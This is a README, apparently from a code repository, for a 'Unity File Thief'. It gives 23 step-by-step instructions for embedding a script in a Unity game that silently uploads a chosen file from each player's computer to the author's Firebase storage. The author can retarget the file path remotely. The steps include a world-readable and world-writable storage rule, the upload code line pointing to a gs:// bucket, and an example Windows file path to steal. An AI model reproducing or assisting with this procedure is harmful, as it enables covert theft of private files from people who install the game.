# It's Updating ...
# ⚠️You May Encounter Errors If You Use It.⚠️



- [Set Up](#set-up)
- [Başlık 2](#başlık-2)
- [Başlık 3](#başlık-3)

## Unity File Thief
Capture the files of users who installed the Application or Game you created in Unity from an address on their computers without permission (or by asking) and store them on the cloud (Firebase). After collecting the file from the user, you can change the path via Firebase and pull different files.  

# Set Up
1- Open your new Unity Project  
**FOR FIREBASE**  
2- Go to : https://console.firebase.google.com/ , If you dont have any account, Sing Up  
3- Add new Project on firebase ; enter a name, Select default account for firebase  
4- Select Unity under the "Get started by adding Firebase to your app" text.  
5- Choose a register type.  
6- Download config file (2nd step) and SDK zip (3th step).  
7- Go to Your Project Console and open -> Build>Storage -> Get Started -> Next -> Done  
8- Under the "Storage" text, select Rules.  
9- Delete the texts of Rules File. And Copy and Paste that Rule :  
<pre>
rules_version ='2';  
service firebase.storage{  
  match /b/{bucket}/o {  
    match /{allPaths=**} {  
      allow read, write:if true;  
    }  
  }  
}  
</pre>
**TURN TO UNITY**  
10- Create a new folder. Name of the folder should be "StreamingAssets"  not with (") - (NAME IS IMPORTANT)  
11- Add config file to that folder. (Config file in the 6th step of the set up)  
12- Extract the Firebase SDK zip and hold FirebaseStorage.unitypackages and drop to project panel on the unity  
13- Import all  
14- Create new GameObject and add fileThieff.cs to your GameObject  
**SET THE SCRIPT**  
15- Go to  Firebase Storage of the YourProject Panel again. There is a copy button Left side of the Upload file  
16- Click Copy button or copy that Url which starts with gs (example ->  gs://file-thied.appspot.com )  
17- Turn to our script. Find that code line "StorageReference storageRef = storage.GetReferenceFromUrl("gs://file-thied.appspot.com/").Child(storagePath);"  
18- Delete that part  ""gs://file-thied.appspot.com/"" and paste your Url  
19- Select the path which file you want to take. Dont get a folder, only file.  
20- Under the Start Method, Find UploadFile() Function and write path (example -> "C:\\aFile\\aText.txt" )  
21- Save the Code and Start Your Game.  
**GET RESULT**  
22- When the users open your game; If they have that file, Our game take its file.  
23- Files go to Storage. You can see the documents on that tab.  

